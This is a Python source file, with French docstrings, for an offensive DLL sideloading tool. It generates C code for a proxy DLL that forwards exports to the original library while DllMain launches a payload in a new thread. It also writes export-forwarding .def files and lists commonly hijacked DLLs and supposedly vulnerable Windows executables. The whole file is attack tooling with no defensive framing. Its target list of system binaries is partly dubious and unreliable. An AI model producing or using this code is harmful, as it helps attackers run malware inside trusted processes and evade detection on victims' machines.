#!/usr/bin/env python3
"""
DLL Sideloading Evasion Technique
- DLL hijacking
- DLL proxying
- DLL search order hijacking
"""

import os
import struct

class DLLSideloader:
    """
    DLL Sideloading pour charger des DLL malicieuses
    via des applications légitimes
    """
    
    # DLLs fréquemment sideloadées
    COMMON_DLLS = [
        "version.dll",
        "wininet.dll", 
        "ws2_32.dll",
        "crypt32.dll",
        "secur32.dll",
        "dnsapi.dll",
        "iphlpapi.dll",
        "setupapi.dll"
    ]
    
    @staticmethod
    def generate_proxy_dll(original_dll_path: str, payload: bytes) -> str:
        """
        Génère une DLL proxy qui forwarde les appels vers la DLL originale
        tout en exécutant le payload
        """
        
        dll_name = os.path.basename(original_dll_path).replace('.dll', '')
        
        code = f'''// DLL Sideloading Proxy - {dll_name}.dll
// Forwarding calls to original DLL while executing payload

#include <windows.h>

// Forward declarations
#pragma comment(linker, "/export:Function1=original_{dll_name}.Function1,@1")
#pragma comment(linker, "/export:Function2=original_{dll_name}.Function2,@2")

// Payload to execute on DLL load
unsigned char payload[] = {{ 
    // ... payload here ...
}};

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {{
    if (reason == DLL_PROCESS_ATTACH) {{
        // Execute payload in separate thread
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)payload, NULL, 0, NULL);
    }}
    return TRUE;
}}

// Export forwarding to original DLL
// Example: #pragma comment(linker, "/export:Function1=original_{dll_name}.Function1,@1")
'''
        return code
    
    @staticmethod
    def generate_dll_def_file(exports: list) -> str:
        """
        Génère un fichier .def pour l'export forwarding
        """
        def_file = "EXPORTS\n"
        for i, export in enumerate(exports, 1):
            def_file += f"    {export}=original.{export} @{i}\n"
        return def_file
    
    @staticmethod
    def find_vulnerable_apps() -> list:
        """
        Liste les applications vulnérables au DLL sideloading
        """
        return [
            "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
            "C:\\Program Files\\Internet Explorer\\iexplore.exe",
            "C:\\Windows\\System32\\notepad.exe",
            "C:\\Windows\\explorer.exe",
            "C:\\Windows\\System32\\wscript.exe"
        ]